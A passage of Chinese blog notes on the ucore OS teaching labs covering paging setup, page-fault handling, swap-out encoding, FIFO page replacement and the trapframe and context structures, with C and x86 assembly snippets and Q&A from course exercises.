<p><strong>第二阶段</strong> 从<code>kern_entry</code>到<code>enable_paging</code>函数，主要采用段机制进行地址映射，需要修改的地方为init/entry.S中的gdt表项，去除KERNBASE有关的定义。此外，还需要修改ucore的链接脚本，将ucore起始的虚拟地址由0xC0100000改为0x00100000。</p>
<p><strong>第三阶段</strong> 从<code>enable_paging</code>函数开始到<code>gdt_init</code>函数，虽然启动了页机制但是未更新段映射，这个时候页机制和段机制对于0xC0000000的偏移是叠加的。由于上一阶段已经修改过段机制的代码，这里仅需要将<code>boot_map_segment</code>函数调用的<code>KERNBASE</code>参数改为0，并取消VPT的递归自映射。这种情况下也没有必要专门建立0-4M物理地址映射，因为即使偏移叠加物理地址和虚拟地址还是相等的（最后有更详细的解释）。</p>
<p><strong>第四阶段</strong> 之后的阶段由于完全启用了页机制，且页机制的相关参数已经在上一步设置完毕，所以无需修改，虚拟地址自会与物理地址相等。</p>
<p>实际上，上述四个阶段也可以分为下面的步骤：启用段机制、启用页机制、更换段机制。整个过程中uCore都必须保证正确的地址映射关系。前期uCore主要使用段机制进行地址偏移、后期uCore则使用页机制进行地址偏移。一个tricky的地方就在于二者的切换：uCore首先建立好偏移的页表，然后将第0项的页表偏移取消，考虑到uCore的内核不会超过4MB，因此在启动页机制之后，内核处的偏移关系仍然是由段机制来维护的。这就保证了启用页表之后，接下来读取gdt表的操作的代码能够正常执行，完成gdt表的修改之后，页机制的映射立刻起作用。此时才可以删除pde索引为0的相关页目录项。这也就解释了为何需要先设立0-4M的页目录项再将其清除的原因。</p>
<blockquote>
<p>一级页表可以不在内存当中吗？</p>
</blockquote>
<p> 不可以。若一级页表不在内存中，那么在page fault时访问异常处理代码，那么在访问处理page fault的代码时发现一级页表不在内存中，再次触发page fault，然后再找，再触发，…于是宕机</p>
<p> 另一种解释：处理器根本没有机制允许操作系统设置第一级页表是否存在。给cr3设置多少，第一级页表基址就是哪里。</p>
<blockquote>
<p>建立页表的时候项数最少可以是多少？</p>
</blockquote>
<p> 1个。</p>
<blockquote>
<p>一条指令会出现多次的访存操作，如果多次出现页缺失异常怎么办？</p>
</blockquote>
<p>在我们的实现当中，如果出现多个页缺失异常，会在执行完指令之后将所有的异常一起处理一遍。</p>
<p>twd2: (1) 执行一条指令最多会有3次访存，取指令，读内存，写回内存，可能涉及到6个页面，它们都有可能缺页。这时只需要正常处理即可：处理一个缺页，返回后又发生缺页，继续处理。</p>
<p>(2) 如果二级页表和实际页面都不在物理内存中，处理器查询一级页表时能够得知二级页表不在内存的情况。由于没有二级页表，处理器无法得知实际页面到底在不在物理内存中（不过我感觉应该也不在）。注意，此时触发的缺页异常，cr2为最终需要访问的线性地址，与二级页表的地址无关（二级页表有线性地址吗？）。在解决缺页过程中的page table walk时，内核会给各级页表分配物理内存（若不存在）并填入映射信息（ucore是get_pte）。</p>
<p>在启动页机制后，不可能进行的操作包括（） </p>
<ul>
<li><input checked="" disabled="" type="checkbox"> 取消段机制，只保留页机制</li>
<li><input disabled="" type="checkbox"> 取消页机制，只保留段机制</li>
<li><input disabled="" type="checkbox"> 取消页机制，也取消段机制</li>
<li><input disabled="" type="checkbox"> 保留页机制，也保留段机制</li>
</ul>
<blockquote>
<p>不可能取消段机制，只保留页机制</p>
</blockquote>
<p>页面置换算法 quiz9</p>
]]></content>
      <categories>
        <category>Systems</category>
      </categories>
      <tags>
        <tag>ucore</tag>
      </tags>
  </entry>
  <entry>
    <title>ucore lab3</title>
    <url>/systems/ucore-lab3/</url>
    <content><![CDATA[<p>ucore lab2通过段页式机制将虚拟内存映射到物理内存，并具体实现了物理内存管理空间中的连续内存分配算法。ucore lab3将实现非连续内存分配中的虚拟内存，借助之前的页表机制和中断异常机制，通过缺页异常的处理来衔接虚拟内存和物理内存之间的差异。与前者差异主要区别在于如何在磁盘交换区缓存页，从而提供比实际物理内存更大的虚拟内存空间。</p>
<a id="more"></a>

<p>lab2没有从一般应用程序对内存需求考虑，缺少相关的数据结构和操作来体现一般应用程序对虚拟内存的需求。ucore通过page fault异常处理来简洁完成虚拟内存和物理内存二者之间的衔接。故引入以下两个数据结构，描述ucore模拟应用程序所需的合法内存空间。当访问内存产生page fault异常时，根据访问内存的读写方式和具体的虚拟内存地址，判断是否在<code>vma_struct</code>所描述的合法地址空间范围内，如果在，则可根据具体情况请求调页/页换入换出处理，如果不在则报错。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//mm结构体描述一个进程的虚拟地址空间，为进程pcb的成员变量</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> mmap_list;        <span class="comment">// 链接到同一页目录表的虚拟内存空间的双向链表 </span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vma_struct</span> *<span class="title">mmap_cache</span>;</span> <span class="comment">// 虚拟内存块缓冲区</span></span><br><span class="line">    <span class="keyword">pde_t</span> *pgdir;                  <span class="comment">//进程对应页目录表</span></span><br><span class="line">    <span class="keyword">int</span> map_count;                 <span class="comment">//虚拟内存块的数目</span></span><br><span class="line">    <span class="keyword">void</span> *sm_priv;                 <span class="comment">//记录页访问情况的链表头</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//vma结构体描述其中一小部分虚拟地址空间</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vma_struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">vm_mm</span>;</span> <span class="comment">//vma对应虚拟内存空间属于的进程 </span></span><br><span class="line">    <span class="keyword">uintptr_t</span> vm_start;      <span class="comment">//连续虚拟空间的起始位置    </span></span><br><span class="line">    <span class="keyword">uintptr_t</span> vm_end;        <span class="comment">//连续虚拟空间的起始位置</span></span><br><span class="line">    <span class="keyword">uint32_t</span> vm_flags;       <span class="comment">//属性 (可读/可写/可执行)</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> list_link;  <span class="comment">//从小到大将虚拟内存地址空间链接到一起</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/07/03/5d1cab4b16bfb33714.png"></p>
<p>涉及<code>vma_struct</code>的操作主要为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct vma_struct * vma_create(uintptr_t vm_start, uintptr_t vm_end, uint32_t vm_flags)</span><br></pre></td></tr></table></figure>
<p>根据输入参数<code>vm_start</code>，<code>vm_end</code>,<code>vm_flags</code>来创建并描述一个虚拟内存空间的<code>vma_struct</code>结构。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void insert_vma_struct(struct mm_struct *mm, struct vma_struct *vma)</span><br></pre></td></tr></table></figure>
<p>把一个vma变量按照从小到大的顺序插入到所属的mm结构体的<code>mmap_list</code>链表中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct vma_struct * find_vma(struct mm_struct *mm, uintptr_t addr)</span><br></pre></td></tr></table></figure>
<p>根据输入参数addr和mm，查找在mm变量中包含该addr的vma,即满足<code>vma-&gt;vm_start&lt;=addr&lt;=vma-&gt;vm_end</code>。</p>
<p>涉及<code>mm_struct</code>的操作主要为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct mm_struct * mm_create(void)</span><br><span class="line">void mm_destroy(struct mm_struct *mm)</span><br></pre></td></tr></table></figure>
<p>在<code>mm_create</code>中用kmalloc分配一块用于<code>mm_struct</code>的空间并初始化，而<code>mm_destroy</code>是<code>mm_create</code>的逆过程，释放对应的空间。</p>
<h1 id="page-fault异常处理"><a href="#page-fault异常处理" class="headerlink" title="page fault异常处理"></a>page fault异常处理</h1><blockquote>
<p>完成do_pgfault（kern/mm/vmm.c）函数，给未被映射的地址映射上物理页。设置访问权限的时候需要参考页面所在VMA 的权限，同时需要注意映射物理页时需要操作内存控制结构所指定的页表，而不是内核的页表。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  ptep = get_pte(mm-&gt;pgdir,addr,<span class="number">1</span>);<span class="comment">//根据缺页地址查找对应pte,若对应页表不存在，则创建一个           //若pte对应的物理页不存在，则分配一物理页并建立物理地址与逻辑地址的映射关系 </span></span><br><span class="line">  <span class="keyword">if</span> (*ptep == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>(pgdir_alloc_page(mm-&gt;pgdir,addr,perm)==<span class="literal">NULL</span>)&#123;</span><br><span class="line">           <span class="keyword">goto</span> failed;</span><br><span class="line">&#125;			 </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//如果PTE存在，则此时P位为0，该页被换出到swap分区中，需要换入内存中</span></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span>(swap_init_ok) &#123;</span><br><span class="line">          struct Page *page=<span class="literal">NULL</span>;                      </span><br><span class="line">          <span class="keyword">if</span>(ret=swap_in(mm,addr,&amp;page)!=<span class="number">0</span>)&#123;</span><br><span class="line">		cprintf(<span class="string">&quot;swap_in in do_pgfault failed\n&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> failed;</span><br><span class="line">	&#125;</span><br><span class="line">     <span class="comment">//根据页目录表找到对应地址所在页在硬盘中的位置并读入				</span></span><br><span class="line">          page_insert(mm-&gt;pgdir,page,addr,perm);<span class="comment">//更改页表中对应项                  </span></span><br><span class="line">          swap_map_swappable(mm,addr,page,<span class="number">0</span>);	<span class="comment">//将该页加入到置换队列中</span></span><br><span class="line">	page-&gt;pra_vaddr=addr;<span class="comment">//设置该物理页对应的虚拟页的起始位置 </span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">          cprintf(<span class="string">&quot;no swap_init_ok but ptep is %x, failed\n&quot;</span>,*ptep);</span><br><span class="line">          <span class="keyword">goto</span> failed;</span><br><span class="line">      &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p><code>do_pgfault</code>函数在缺页的时候被触发，表明用户访问的虚拟地址在物理内存中没有对应的映射，这种情况可能是非法访存，也有可能是合理访存。该函数先检查非法情况，即通过vma中的标志位判断。<br>页访问异常错误码有32位，位0为1表示对应物理页不存在;位1为1表示写异常(比如写了只读页);位2为1表示访问状态异常(比如用户程序访问了内核空间的数据)。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">switch (error_code &amp; 3) &#123;</span><br><span class="line">    default:</span><br><span class="line">            &#x2F;* error code flag : default is 3 ( W&#x2F;R&#x3D;1, P&#x3D;1): write, present *&#x2F;</span><br><span class="line">    case 2: &#x2F;* error code flag : (W&#x2F;R&#x3D;1, P&#x3D;0): write, not present *&#x2F;</span><br><span class="line">        if (!(vma-&gt;vm_flags &amp; VM_WRITE)) &#123;</span><br><span class="line">            cprintf(&quot;do_pgfault failed: error code flag &#x3D; write AND not present, but the addr&#39;s vma cannot write\n&quot;);</span><br><span class="line">            goto failed;</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line">    case 1: &#x2F;* error code flag : (W&#x2F;R&#x3D;0, P&#x3D;1): read, present *&#x2F;</span><br><span class="line">        cprintf(&quot;do_pgfault failed: error code flag &#x3D; read AND present\n&quot;);</span><br><span class="line">        goto failed;</span><br><span class="line">    case 0: &#x2F;* error code flag : (W&#x2F;R&#x3D;0, P&#x3D;0): read, not present *&#x2F;</span><br><span class="line">        if (!(vma-&gt;vm_flags &amp; (VM_READ | VM_EXEC))) &#123;</span><br><span class="line">            cprintf(&quot;do_pgfault failed: error code flag &#x3D; read AND not present, but the addr&#39;s vma cannot read or exec\n&quot;);</span><br><span class="line">            goto failed;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>以上为异常情况。以上情况之一出现时，那么就会产生缺页异常。CPU会把产生异常的线性地址存储在CR2中，并把表示页访问异常类型的值(页访问异常错误码)保存在中断栈中。</p>
<p>CR2是页故障地址寄存器，保存最后一次出现页故障的全32位线性地址。CR2用于页异常时报告出错信息。当发生页访问异常时，处理器把引起页异常的地址保存在CR2中。操作系统中对应的中断服务例程可以检查CR2的内容，从而查出线性地址空间哪个页引起本次异常。</p>
<p>我们需要完成的部分是对合理访问内存的处理。合理访问内存又分为以下两种情况：</p>
<ul>
<li>该页存在于swap分区中</li>
<li>第一次访问该页，仅在<code>vma_struct</code>中存在对应区域，而没有写入页表，分配物理页</li>
</ul>
<p>此外，我们再关注一下<code>check_pgfault</code>的实现，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pde_t *pgdir &#x3D; mm-&gt;pgdir &#x3D; boot_pgdir;</span><br></pre></td></tr></table></figure>
<p>在启动阶段建立好了启动页目录表，并且建立了如下映射关系</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">virt addr &#x3D; linear addr &#x3D; phy addr + 0xC0000000</span><br></pre></td></tr></table></figure>
<p>程序在声明变量时会分配对应的内存并建立映射关系，若直接访问或读取之前声明过的变量则不会引发page fault。这里将初始指针指向<code>0x100</code> ，<code>0x100</code>存在于第1个虚拟页中，在初始的映射关系中并没有相关的条目，所以在第一次访问时触发缺页异常，此后访问地址都在一页的范围内，不会再引发异常。另外，虚拟地址从 <code>0xC0000000</code>开始是启动阶段的映射，之后的访问会动态改变其中页表项，映射也将不再是单一的连续映射，访问虚拟内存地址空间的地址均可以，并不是只有<code>0xC0000000</code>以后的虚拟地址才为合法的地址。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct vma_struct *vma &#x3D; vma_create(0, PTSIZE, VM_WRITE);</span><br><span class="line">insert_vma_struct(mm, vma);</span><br></pre></td></tr></table></figure>
<p>设置从0开始的1024个虚拟页为合法地址空间，并插入到对应的<code>mm_struct</code>中。</p>
<blockquote>
<p>请描述页目录项（Pag Director Entry）和页表（Page Table Entry）中组成部分对ucore实现页替换算法的潜在用处。</p>
</blockquote>
<p>通过设置PTE中的标志位来查看缺页中断的原因，在扩展时钟算法中，则需要使用PTE中的Access位和Dirty位进行记录该页的历史访问情况。</p>
<ul>
<li>页表项中的访问位用于页面置换算法，页面置换算法可能需要根据不同页面是否被访问，访问时间和访问频率等进行淘汰页面的选择。</li>
<li>页表项中修改位供换出页面使用，页面换出的时候，需要判断外存上的相应页面是否需要重写。如果内存中该页面在使用期间发生了修改，则相应的修改位被设置，用于换出的时候通知操作系统进行外存相应页面的修改。</li>
<li>页表项的状态位用于指示该页是否已经调入内存，供程序访问时使用，如果发现该页未调入内存，则产生缺页中断，由操作系统进行相应处理。</li>
</ul>
<blockquote>
<p>如果ucore的缺页服务例程在执行过程中访问内存，出现了页访问异常，请问硬件要做哪些事情？</p>
</blockquote>
<p>这种情况一般不会发生，除非操作系统内核出现故障。对于x86的CPU，会保存现场，并进入double_fault异常而非缺页异常供操作系统开发人员捕捉错误并处理。对于Qemu来说，三次出现嵌套缺页异常的情况下模拟器就会出错退出。</p>
<blockquote>
<p>页目录项和页表项的dirty bit是何时，由谁置1的？</p>
</blockquote>
<p>在页面被修改时由硬件置1的。</p>
<blockquote>
<p>页目录项和页表项的access bit是何时，由谁置1的？</p>
</blockquote>
<p>在页面被访问时由硬件置1的。</p>
<h1 id="页面置换机制"><a href="#页面置换机制" class="headerlink" title="页面置换机制"></a>页面置换机制</h1><h2 id="可以换出的页"><a href="#可以换出的页" class="headerlink" title="可以换出的页"></a>可以换出的页</h2><p>一个基本的原则是：并非所有的物理页都可以交换出去的，只有映射到用户空间且被用户程序直接访问的页面才能被交换，而被内核直接使用的内核空间的页面不能被换出。操作系统是执行的关键代码，需要保证运行的高效性和实时性，如果在操作系统执行过程中，发生了缺页现象，则操作系统不得不等很长时间（硬盘的访问速度比内存的访问速度慢2~3个数量级），这将导致整个系统运行低效。不难想象，处理缺页过程所用到的内核代码或者数据如果被换出，整个内核都面临崩溃的危险。</p>
<h2 id="虚存中的页与硬盘上扇区的关系"><a href="#虚存中的页与硬盘上扇区的关系" class="headerlink" title="虚存中的页与硬盘上扇区的关系"></a>虚存中的页与硬盘上扇区的关系</h2><p>如果一个页被置换到了硬盘上，那操作系统如何简洁地来表示这种情况呢？在ucore的设计上，在PTE中描述这种情况：当一个PTE用来描述一般意义上的物理页时，显然它应该维护各种权限和映射关系，同时有PTE_P标记；但当它用来描述一个被置换出去的物理页时，它被用来维护该物理页与 swap 磁盘上扇区的映射关系，并且该 PTE 不应该由 MMU 将它解释成物理页映射(即没有 PTE_P 标记)，与此同时对应的权限则交由 <code>mm_struct</code> 来维护，当访问位于该页的内存地址时，必然导致 page fault，然后ucore能够根据 PTE 描述的 swap 项将相应的物理页重新建立起来，并根据虚存所描述的权限重新设置好 PTE 使得内存访问能够继续正常进行。</p>
<p><code>swap_out</code>中设置pte的操作如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v=page-&gt;pra_vaddr; </span><br><span class="line"><span class="keyword">pte_t</span> *ptep = get_pte(mm-&gt;pgdir, v, <span class="number">0</span>);</span><br><span class="line">assert((*ptep &amp; PTE_P) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (swapfs_write( (page-&gt;pra_vaddr/PGSIZE+<span class="number">1</span>)&lt;&lt;<span class="number">8</span>, page) != <span class="number">0</span>) &#123;</span><br><span class="line">	cprintf(<span class="string">&quot;SWAP: failed to save\n&quot;</span>);</span><br><span class="line">	sm-&gt;map_swappable(mm, v, page, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	cprintf(<span class="string">&quot;swap_out: i %d, store page in vaddr 0x%x to disk swap entry %d\n&quot;</span>, i, v, page-&gt;pra_vaddr/PGSIZE+<span class="number">1</span>);</span><br><span class="line">	*ptep = (page-&gt;pra_vaddr/PGSIZE+<span class="number">1</span>)&lt;&lt;<span class="number">8</span>;</span><br><span class="line">	free_page(page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>swap_in</code>中访问pte的操作如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pte_t</span> *ptep = get_pte(mm-&gt;pgdir, addr, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// cprintf(&quot;SWAP: load ptep %x swap entry %d to vaddr 0x%08x, page %x, No %d\n&quot;, ptep, (*ptep)&gt;&gt;8, addr, result, (result-pages));</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line"><span class="keyword">if</span> ((r = swapfs_read((*ptep), result)) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">assert(r!=<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>swapfs_read</code>的定义为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int swapfs_read(swap_entry_t entry, struct Page *page)</span><br></pre></td></tr></table></figure>
<p>此时<code>ptep</code>指向的内容为<code>swap_entry_t</code>类型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">swap_entry_t</span><br><span class="line">  --------------------------------------------</span><br><span class="line"> |         offset        |   reserved   | 0 |</span><br><span class="line">  --------------------------------------------</span><br><span class="line">           24 bits            7 bits    1 bit</span><br></pre></td></tr></table></figure>
<p>如果一个页（4KB/页）被置换到了硬盘某8个扇区（0.5KB/扇区），该PTE的最低位(present位)应该为0 （即 PTE_P 标记为空，表示虚实地址映射关系不存在，接下来的7位暂时保留，可以用作各种扩展；而原来用来表示页帧号的高24位地址，恰好可以用来表示此页在硬盘上的起始扇区的位置（其从第几个扇区开始）。为了在页表项中区别 0 和 swap 分区的映射，将 swap 分区的一个 page 空出来不用，也就是说一个高24位不为0，而最低位为0的PTE表示了一个放在硬盘上的页的起始扇区号。通过这种方式来映射磁盘扇区。</p>
<p>ucore用了第二个IDE硬盘作为交换区来保存被换出的扇区，262144/8=32768个页，即128MB的内存空间。</p>
<h2 id="执行换入换出的时间"><a href="#执行换入换出的时间" class="headerlink" title="执行换入换出的时间"></a>执行换入换出的时间</h2><p><strong>换入的时机</strong></p>
<p>当ucore或应用程序访问地址所在的页不在内存时，就会产生page fault异常，之后调用<strong>do_pgfault</strong>函数，判断产生访问异常的地址属于<code>check_mm_struct</code>的合法虚拟地址空间，若保存在硬盘swap文件中（即对应的PTE的高24位不为0，而最低位为0），则是执行页换入的时机，将调用swap_in函数完成页面换入。</p>
<p><strong>换出的时机</strong></p>
<p>换出针对不同的策略有不同的时机。ucore目前大致有两种策略，即积极换出策略和消极换出策略。</p>
<ul>
<li>积极换出策略是指操作系统周期性地（或在系统不忙的时候）主动把某些认为“不常用”的页换出到硬盘上，从而确保系统中总有一定数量的空闲页存在，这样当需要空闲页时，基本上能够及时满足需求</li>
<li>消极换出策略是指，只是当试图得到空闲页时，发现当前没有空闲的物理页可供分配，这时才开始查找“不常用”页面，并把一个或多个这样的页换出到硬盘上。</li>
</ul>
<h1 id="基于FIFO的页面替换算法"><a href="#基于FIFO的页面替换算法" class="headerlink" title="基于FIFO的页面替换算法"></a>基于FIFO的页面替换算法</h1><p>完成vmm.c中的<code>do_pgfault</code>函数，并且在实现FIFO算法的<code>swap_fifo.c</code>中完成<code>map_swappable</code>和<code>swap_out_victim</code>函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">_fifo_map_swappable(struct mm_struct *mm, <span class="keyword">uintptr_t</span> addr, struct Page *page, <span class="keyword">int</span> swap_in)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">list_entry_t</span> *head=(<span class="keyword">list_entry_t</span>*) mm-&gt;sm_priv;</span><br><span class="line">    <span class="keyword">list_entry_t</span> *entry=&amp;(page-&gt;pra_page_link);</span><br><span class="line"> </span><br><span class="line">    assert(entry != <span class="literal">NULL</span> &amp;&amp; head != <span class="literal">NULL</span>);</span><br><span class="line">	list_add(head,entry);<span class="comment">//将这一页插入到head之后</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">_fifo_swap_out_victim(struct mm_struct *mm, struct Page ** ptr_page, <span class="keyword">int</span> in_tick)</span><br><span class="line">&#123;</span><br><span class="line">     <span class="keyword">list_entry_t</span> *head=(<span class="keyword">list_entry_t</span>*) mm-&gt;sm_priv;</span><br><span class="line">         assert(head != <span class="literal">NULL</span>);</span><br><span class="line">     assert(in_tick==<span class="number">0</span>); </span><br><span class="line">	 <span class="keyword">list_entry_t</span> *le=head-&gt;prev;<span class="comment">//设为最先进入的页</span></span><br><span class="line">	 <span class="class"><span class="keyword">struct</span> <span class="title">Page</span>* <span class="title">page</span>=</span>le2page(le,pra_page_link);</span><br><span class="line">	 list_del(le);<span class="comment">//从置换队列中移出</span></span><br><span class="line">	 *ptr_page=page;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>lab3内容较少，将后面部分的trapframe context挪至此处。</p>
</blockquote>
<h1 id="trapframe和context的原理和区别"><a href="#trapframe和context的原理和区别" class="headerlink" title="trapframe和context的原理和区别"></a>trapframe和context的原理和区别</h1><p>在ucore中，<code>trapframe</code>和<code>context</code>均出现在了线程的调度中。实际上，结构体<code>trapframe</code>用于切换优先级、页表目录等，而<code>context</code>则是用于轻量级的上下文切换。两者的区别在于<code>context</code>仅仅能够切换普通寄存器，而<code>trapframe</code>可以切换包括普通寄存器、段寄存器以及少量的控制寄存器。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct trapframe &#123;</span><br><span class="line">    struct pushregs tf_regs;</span><br><span class="line">    uint16_t tf_gs;</span><br><span class="line">    uint16_t tf_padding0;</span><br><span class="line">    uint16_t tf_fs;</span><br><span class="line">    uint16_t tf_padding1;</span><br><span class="line">    uint16_t tf_es;</span><br><span class="line">    uint16_t tf_padding2;</span><br><span class="line">    uint16_t tf_ds;</span><br><span class="line">    uint16_t tf_padding3;</span><br><span class="line">    uint32_t tf_trapno;</span><br><span class="line">    &#x2F;* below here defined by x86 hardware *&#x2F;</span><br><span class="line">    uint32_t tf_err;</span><br><span class="line">    uintptr_t tf_eip;</span><br><span class="line">    uint16_t tf_cs;</span><br><span class="line">    uint16_t tf_padding4;</span><br><span class="line">    uint32_t tf_eflags;</span><br><span class="line">    &#x2F;* below here only when crossing rings, such as from user to kernel *&#x2F;</span><br><span class="line">    uintptr_t tf_esp;</span><br><span class="line">    uint16_t tf_ss;</span><br><span class="line">    uint16_t tf_padding5;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure>
<p><code>trapframe</code>中依次存储了：</p>
<ul>
<li>目标寄存器</li>
<li><code>gs</code>, <code>fs</code>, <code>es</code>, <code>ds</code> 段寄存器</li>
<li><code>tf_trapno</code>, <code>err</code> 用于储存中断信息</li>
<li><code>eip</code>, <code>cs</code>, <code>eflags</code> 用于存储陷阱(trap)返回后的目的地址</li>
<li><code>esp</code>, <code>ss</code> 在权限发生变化时，用于指示新的栈的位置</li>
</ul>
<p>ucore有两处用到了<code>trapframe</code>，一是中断调用，而是进程切换，接下来分别分析二者的情况</p>
<h2 id="中断调用中使用trapframe"><a href="#中断调用中使用trapframe" class="headerlink" title="中断调用中使用trapframe"></a>中断调用中使用trapframe</h2><p><code>trapframe</code>在中断中，在前期负责中断信息的储存，后期负责中断的恢复。同时，<code>trapframe</code>结构体是位于栈中的，其生成和使用都是通过栈的<code>push</code>、<code>pop</code>命令实现的。</p>
<p>中断发生时，以下代码将信息压入栈中，与tf结构体中成员变量一一对应，之后调用<code>trap(struct trapframe *tf)</code>函数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.globl __alltraps</span><br><span class="line">__alltraps:</span><br><span class="line">    # push registers to build a trap frame</span><br><span class="line">    # therefore make the stack look like a struct trapframe</span><br><span class="line">    pushl %ds</span><br><span class="line">    pushl %es</span><br><span class="line">    pushl %fs</span><br><span class="line">    pushl %gs</span><br><span class="line">    pushal</span><br><span class="line"></span><br><span class="line">    # load GD_KDATA into %ds and %es to set up data segments for kernel</span><br><span class="line">    movl $GD_KDATA, %eax</span><br><span class="line">    movw %ax, %ds</span><br><span class="line">    movw %ax, %es</span><br><span class="line"></span><br><span class="line">    # push %esp to pass a pointer to the trapframe as an argument to trap()</span><br><span class="line">    pushl %esp</span><br><span class="line"></span><br><span class="line">    # call trap(tf), where tf&#x3D;%esp</span><br><span class="line">    call trap</span><br></pre></td></tr></table></figure>
<p>中断处理结束后，将原来信息一一pop，从而恢复之前的执行状态。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># pop the pushed stack pointer</span><br><span class="line">    popl %esp</span><br><span class="line"></span><br><span class="line">    # return falls through to trapret...</span><br><span class="line">.globl __trapret</span><br><span class="line">__trapret:</span><br><span class="line">    # restore registers from stack</span><br><span class="line">    popal</span><br><span class="line"></span><br><span class="line">    # restore %ds, %es, %fs and %gs</span><br><span class="line">    popl %gs</span><br><span class="line">    popl %fs</span><br><span class="line">    popl %es</span><br><span class="line">    popl %ds</span><br><span class="line"></span><br><span class="line">    # get rid of the trap number and error code</span><br><span class="line">    addl $0x8, %esp</span><br><span class="line">    iret</span><br></pre></td></tr></table></figure>
<p>在调用<code>call trap</code>之后，有一句<code>popl %esp</code>，而后续恢复的信息完全是基于该<code>%esp</code>进行定位的，那么在中断处理内存中，如果我们强行修改<code>%esp</code>成为我们希望接下来运行的代码段的trap描述，那么经过<code>__trapret</code>代码恢复<code>trapframe</code>后，你就可以让程序跳转到任何你希望的地方。</p>
<p>在lab1的challenge中，我们通过以下设置<code>trapframe</code>来完成用户态到内核态的切换</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (tf-&gt;tf_cs != KERNEL_CS) &#123;</span><br><span class="line">        tf-&gt;tf_cs = KERNEL_CS;<span class="comment">//直接修改内核堆栈</span></span><br><span class="line">        tf-&gt;tf_ds = tf-&gt;tf_es = KERNEL_DS;</span><br><span class="line">        tf-&gt;tf_eflags &amp;= ~FL_IOPL_MASK;</span><br><span class="line">        switchu2k = (struct trapframe *)(tf-&gt;tf_esp - (<span class="keyword">sizeof</span>(struct trapframe) - <span class="number">8</span>));</span><br><span class="line">        <span class="comment">//tf结构体开始的位置</span></span><br><span class="line">        memmove(switchu2k, tf, <span class="keyword">sizeof</span>(struct trapframe) - <span class="number">8</span>);</span><br><span class="line">        <span class="comment">//由于进入中断时，是用户态进入内核态，而退出中断时，是内核态返回内核态</span></span><br><span class="line">        <span class="comment">//所以去掉最后的esp与ss</span></span><br><span class="line">        *((<span class="keyword">uint32_t</span> *)tf - <span class="number">1</span>) = (<span class="keyword">uint32_t</span>)switchu2k;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>((uint32_t *)tf - 1)</code> 地址后存放了我们修改后的<code>trapframe</code>，即<code>popl %esp</code>恢复的<code>%esp</code>的值。</p>
<h2 id="进程切换中使用context"><a href="#进程切换中使用context" class="headerlink" title="进程切换中使用context"></a>进程切换中使用context</h2><p><code>context</code>结构体定义如下，其中存储了所有用户寄存器的值。</p>
